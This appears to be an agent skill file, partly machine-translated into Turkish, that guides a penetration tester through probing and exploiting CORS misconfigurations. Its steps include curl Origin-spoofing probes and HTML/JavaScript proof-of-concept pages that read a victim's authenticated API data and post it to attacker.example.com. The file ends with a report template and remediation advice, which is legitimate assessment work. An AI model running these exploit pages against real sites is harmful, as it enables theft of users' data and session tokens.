---
name: testing-cors-misconfiguration
description: Identifying and exploiting Cross-Origin Resource Sharing misconfigurations that allow unauthorized cross-domain data access and credential theft during security assessments.
tags:
- web-security
- owasp
- cors
- fetih
- web-application-security
- burpsuite
- cybersecurity
- penetration-testing
- same-origin-policy
- siber-güvenlik
triggers:
- CSRF
- SQL injection
- XSS
- api
- cors
- email
- endpoint
- exploit
- http
- log
- misconfiguration
- network
category: web-application-security
source_subdomain: web-application-security
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
---

# Testing Cors Misconfiguration


## Ne Zaman Kullanılır

- During authorized penetration tests assessing yaparken API endpoints for cross-origin access controls
- testing yaparken single-page applications that make cross-origin API requests
- For evaluating whether sensitive data can be exfiltrated from a victim's browser session
- assessing yaparken microservice architectures with multiple domains sharing data
- During security audits of applications using CORS headers for cross-domain communication

## Ön Gereksinimler

- **Authorization**: Written penetration testing agreement for the target
- **Burp Suite Professional**: For intercepting and modifying Origin headers
- **Browser with DevTools**: For observing CORS behavior in real browser context
- **Attacker web server**: For hosting CORS exploitation PoC pages
- **curl**: For manual CORS header testing
- **Python HTTP server**: For hosting exploit pages locally

## İş Akışı

### Adım 1: Identify CORS Configuration on Target Endpoints

Check all API endpoints for CORS response headers.

```bash
curl -s -I \
  -H "Origin: https://evil.example.com" \
  "https://api.target.example.com/api/user/profile"


for endpoint in /api/user/profile /api/user/settings /api/transactions \
  /api/admin/users /api/account/balance; do
  echo "=== $endpoint ==="
  curl -s -I \
    -H "Origin: https://evil.example.com" \
    "https://api.target.example.com$endpoint" | \
    grep -i "access-control"
  echo
done
```

### Adım 2: Test Origin Reflection and Validation Bypass

Belirle: how the server validates the Origin header.

```bash
curl -s -I -H "Origin: https://evil.com" \
  "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"

curl -s -I -H "Origin: null" \
  "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"

curl -s -I -H "Origin: https://evil.target.example.com" \
  "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"

curl -s -I -H "Origin: https://target.example.com.evil.com" \
  "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"

curl -s -I -H "Origin: https://eviltarget.example.com" \
  "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"

curl -s -I -H "Origin: http://target.example.com" \
  "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"

curl -s -I -H "Origin: https://target.example.com%60.evil.com" \
  "https://api.target.example.com/api/user/profile" | grep -i "access-control-allow-origin"

curl -s -I -H "Origin: https://evil.com" \
  "https://api.target.example.com/api/public" | grep -iE "access-control-allow-(origin|credentials)"
```

### Adım 3: Test Preflight Request Handling

Assess how the server handles OPTIONS preflight requests.

```bash
curl -s -I -X OPTIONS \
  -H "Origin: https://evil.example.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: Authorization, Content-Type" \
  "https://api.target.example.com/api/user/profile"


curl -s -I -X OPTIONS \
  -H "Origin: https://evil.example.com" \
  -H "Access-Control-Request-Method: DELETE" \
  "https://api.target.example.com/api/user/profile" | \
  grep -i "access-control-allow-methods"

curl -s -I -X OPTIONS \
  -H "Origin: https://evil.example.com" \
  -H "Access-Control-Request-Method: GET" \
  "https://api.target.example.com/api/user/profile" | \
  grep -i "access-control-max-age"
```

### Adım 4: Craft CORS Exploitation Proof of Concept

Build an HTML page that exploits the CORS misconfiguration to steal data.

```html
<!-- cors-exploit.html - Host on attacker server -->
<html>
<head><title>CORS PoC</title></head>
<body>
<h1>CORS Exploitation Proof of Concept</h1>
<div id="result"></div>
<script>
// Exploit: Read victim's profile data cross-origin
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    // Data successfully stolen cross-origin
    document.getElementById('result').innerText = xhr.responseText;

    // Exfiltrate to attacker server
    var exfil = new XMLHttpRequest();
    exfil.open('POST', 'https://attacker.example.com/collect', true);
    exfil.setRequestHeader('Content-Type', 'application/json');
    exfil.send(xhr.responseText);
  }
};
xhr.open('GET', 'https://api.target.example.com/api/user/profile', true);
xhr.withCredentials = true;  // Include victim's cookies
xhr.send();
</script>
</body>
</html>
```

```html
<!-- Exploit using fetch API -->
<script>
fetch('https://api.target.example.com/api/user/profile', {
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  // Steal sensitive data
  fetch('https://attacker.example.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
  console.log('Stolen data:', data);
});
</script>
```

### Adım 5: Exploit Null Origin Vulnerability

If `Origin: null` is allowed, exploit via sandboxed iframes.

```html
<!-- null-origin-exploit.html -->
<html>
<body>
<h1>Null Origin CORS Exploit</h1>
<!--
  Sandboxed iframe sends requests with Origin: null
  If server reflects Access-Control-Allow-Origin: null with credentials,
  data can be exfiltrated
-->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="
  <script>
    var xhr = new XMLHttpRequest();
    xhr.onload = function() {
      // Send stolen data to parent or attacker server
      fetch('https://attacker.example.com/collect', {
        method: 'POST',
        body: xhr.responseText
      });
    };
    xhr.open('GET', 'https://api.target.example.com/api/user/profile');
    xhr.withCredentials = true;
    xhr.send();
  </script>
"></iframe>
</body>
</html>

<!-- Alternative: data: URI for null origin -->
<!-- Open in browser: data:text/html,<script>...</script> -->
```

### Adım 6: Test for Internal Network Access via CORS

Check if CORS allows access from internal origins that could be leveraged via XSS.

```bash
INTERNAL_ORIGINS=(
  "http://localhost"
  "http://localhost:3000"
  "http://localhost:8080"
  "http://127.0.0.1"
  "http://192.168.1.1"
  "http://10.0.0.1"
  "https://staging.target.example.com"
  "https://dev.target.example.com"
  "https://test.target.example.com"
)

for origin in "${INTERNAL_ORIGINS[@]}"; do
  echo -n "$origin: "
  curl -s -I -H "Origin: $origin" \
    "https://api.target.example.com/api/user/profile" | \
    grep -i "access-control-allow-origin" | tr -d '\r'
  echo
done

```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Same-Origin Policy** | Browser security model preventing scripts from one origin accessing data from another |
| **CORS** | Mechanism allowing servers to specify which origins can access their resources |
| **Origin Reflection** | Server mirrors the request Origin header in the ACAO response header (dangerous) |
| **Null Origin** | Special origin value from sandboxed iframes, data URIs, and redirects |
| **Preflight Request** | OPTIONS request sent before certain cross-origin requests to check permissions |
| **Credentialed Requests** | Cross-origin requests that include cookies, requiring explicit ACAO + ACAC headers |
| **Wildcard CORS** | `Access-Control-Allow-Origin: *` allows any origin but prohibits credentials |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Intercepting requests and modifying Origin headers |
| **CORScanner** | Automated CORS misconfiguration scanner (`pip install corscanner`) |
| **cors-scanner** | Node.js-based CORS testing tool |
| **Browser DevTools** | Monitoring CORS errors and network requests in real browser context |
| **Python http.server** | Hosting CORS exploit PoC pages |
| **OWASP ZAP** | Automated CORS misconfiguration Tespit |

## Common Scenarios

### Scenario 1: Full Origin Reflection
The API reflects any Origin header in `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true`. Any website can read authenticated API responses, stealing user data.

### Scenario 2: Null Origin Allowed
The server allows `Origin: null` with credentials. Using a sandboxed iframe, an attacker page sends credentialed requests to the API and reads the response data.

### Scenario 3: Subdomain Wildcard Trust
The CORS policy allows `*.target.example.com`. An attacker Bul:s XSS on `forum.target.example.com` and uses it to make cross-origin requests to `api.target.example.com`, stealing user data through the trusted subdomain.

### Scenario 4: Regex Bypass on Origin Validation
The server uses regex `target\.example\.com` to validate origins, but fails to anchor the regex. `attackertarget.example.com` matches and is allowed access.

## Output Format

```
## CORS Misconfiguration Bul:ing

**Vulnerability**: CORS Origin Reflection with Credentials
**Severity**: High (CVSS 8.1)
**Location**: All /api/* endpoints on api.target.example.com
**OWASP Category**: A01:2021 - Broken Access Control

### CORS Configuration Observed
| Header | Value |
|--------|-------|
| Access-Control-Allow-Origin | [Reflects request Origin] |
| Access-Control-Allow-Credentials | true |
| Access-Control-Allow-Methods | GET, POST, PUT, DELETE |
| Access-Control-Expose-Headers | X-Auth-Token |

### Origin Validation Results
| Origin Tested | Reflected | Credentials |
|---------------|-----------|-------------|
| https://evil.com | Yes | Yes |
| null | Yes | Yes |
| http://localhost | Yes | Yes |
| https://evil.target.example.com | Yes | Yes |

### Impact
- Any website can read authenticated API responses in victim's browser
- User profile data (email, phone, address) exfiltrable
- Session tokens exposed via X-Auth-Token header
- CSRF protection bypassed (attacker can read and submit anti-CSRF tokens)

### Recommendation
1. Implement a strict allowlist of trusted origins
2. Never reflect arbitrary Origin values in Access-Control-Allow-Origin
3. Do not allow Origin: null with credentials
4. Validate origins with exact string matching, not regex substring matching
5. Set Access-Control-Max-Age to a reasonable value (600 seconds)
```
